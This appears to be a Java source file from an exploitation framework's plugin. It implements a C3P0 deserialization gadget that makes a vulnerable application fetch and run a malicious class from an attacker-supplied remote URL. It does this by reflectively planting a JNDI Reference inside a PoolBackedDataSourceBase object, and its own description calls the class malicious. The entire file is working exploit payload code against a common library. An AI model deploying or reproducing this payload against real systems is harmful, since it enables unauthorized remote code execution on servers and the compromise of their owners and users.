package me.gv7.woodpecker.plugin.gadgets.other;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import me.gv7.woodpecker.plugin.annotation.DependenciesVersion;
import me.gv7.woodpecker.plugin.annotation.Description;
import me.gv7.woodpecker.plugin.annotation.RequireParameter;
import me.gv7.woodpecker.plugin.core.pojo.Input;
import me.gv7.woodpecker.plugin.gadgets.ObjectPayload;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

@Description("C3P0远程加载恶意类")
@DependenciesVersion("C3P0-0.9.5.2")
@RequireParameter("UrlClassLocation")
public class C3P0URLClassLoader implements ObjectPayload {

    public static String className;
    public static String factory;
    public static String factoryLocation;


    @Override
    public <T> Object getObject(Input input) throws Exception {
        C3P0URLClassLoader.className = input.getClassName();
        C3P0URLClassLoader.factory = input.getFactory();
        C3P0URLClassLoader.factoryLocation = input.getFactoryLocation();
        EXP_Loader exp = new EXP_Loader();
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Class cls = poolBackedDataSourceBase.getClass();
        Field field = cls.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase,exp);
        return poolBackedDataSourceBase;
    }


    public static class EXP_Loader implements ConnectionPoolDataSource, Referenceable{
        @Override
        public Reference getReference() throws NamingException {
            return new Reference(C3P0URLClassLoader.className,C3P0URLClassLoader.factory,C3P0URLClassLoader.factoryLocation);
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

//    public static byte[] getBytes(final String className, final String factory, final String factoryLocation) throws Exception {
//        Object ht = getObject(className,factory,factoryLocation);
//        ByteArrayOutputStream baous = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(baous);
//        oos.writeObject(ht);
//        byte[] bytes = baous.toByteArray();
//        oos.close();
//        return bytes;
//    }
}